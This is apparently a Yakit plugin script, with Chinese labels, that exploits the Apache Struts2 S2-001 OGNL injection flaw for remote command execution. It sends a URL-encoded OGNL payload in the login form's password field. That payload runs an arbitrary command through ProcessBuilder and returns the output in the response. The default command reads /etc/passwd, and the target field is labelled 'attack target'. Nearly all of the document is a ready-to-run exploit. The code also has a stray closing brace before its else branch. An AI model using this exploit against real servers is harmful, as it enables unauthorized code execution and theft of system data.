script_name: S2-001 远程代码执行漏洞利用EXP
content:
yakit.AutoInitYakit()

# Input your code!


isHttps = cli.Have("https", cli.setDefault(false))

packet = `
POST /login.action HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62
Content-Length: 590

username=&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B{{params(cmd)}}%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D`

log.setLevel("info")
yakit.Info("开始解析参数！")

target = cli.String("target")
cmd = cli.String("cmd")
cmd = codec.EncodeUrl(cmd)
if target == "" {
    yakit.Error("没有输入检测地址！")
    os.Exit()
}
if cmd == "" {
    yakit.Error("没有输入要执行的命令！")
    os.Exit()
}
sendPacket = func(target,cmd) {
    return poc.HTTP(
        packet, 
        poc.timeout(10),
        # poc.proxy("http://127.0.0.1:8083"),
        # poc.proxy("http://127.0.0.1:7890"),
        poc.redirectTimes(3),  # 重定向次数
        poc.https(isHttps),
        poc.params({
            "cmd": cmd,
            "target": target
        },
    ))
}
yakit.Info("开始进行命令执行！")
rsp, rep, err =sendPacket(target,cmd)
if err != nil {
    yakit.SetProgress(0.1)
    sleep(1)
    yakit.SetProgress(0.4)
    sleep(1)
    yakit.SetProgress(0.8)
    sleep(1)
    yakit.SetProgress(1.0)
    sleep(1)
    yakit.Error("命令执行失败！")
    die(err) 
 }
ins,err=poc.ParseBytesToHTTPResponse(rsp)
if err != nil {
    yakit.SetProgress(0.1)
    sleep(1)
    yakit.SetProgress(0.4)
    sleep(1)
    yakit.SetProgress(0.8)
    sleep(1)
    yakit.SetProgress(1.0)
    sleep(1)
    yakit.Error("命令执行失败！")
    die(err) 
 }
if ins.StatusCode==200{
    yakit.SetProgress(0.1)
    sleep(1)
    yakit.SetProgress(0.4)
    sleep(1)
    yakit.SetProgress(0.8)
    sleep(1)
    yakit.SetProgress(1.0)
    sleep(1)
    yakit.Info("命令执行成功！")
    headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    yakit.Info(body)
    log.info(body)
}
}else{
    yakit.SetProgress(0.1)
    sleep(1)
    yakit.SetProgress(0.4)
    sleep(1)
    yakit.SetProgress(0.8)
    sleep(1)
    yakit.SetProgress(1.0)
    sleep(1)
    yakit.Error("命令执行失败！")
    yakit.Warn("状态码：", ins.StatusCode)

}
params: "[{\"Field\":\"cmd\",\"DefaultValue\":\"\\\"cat\\\",\\\"/etc/passwd\\\"\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"要执行的命令\",\"Help\":\"输入要执行的命令，注意格式：\\\"cat\\\",\\\"etc/passwd\\\"\",\"Required\":true},{\"Field\":\"target\",\"DefaultValue\":\"1.1.1.1:1234\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"攻击目标\",\"Help\":\"输入要利用的地址：1.1.1.1:1234/xxx.xx:8080\",\"Required\":true}]"
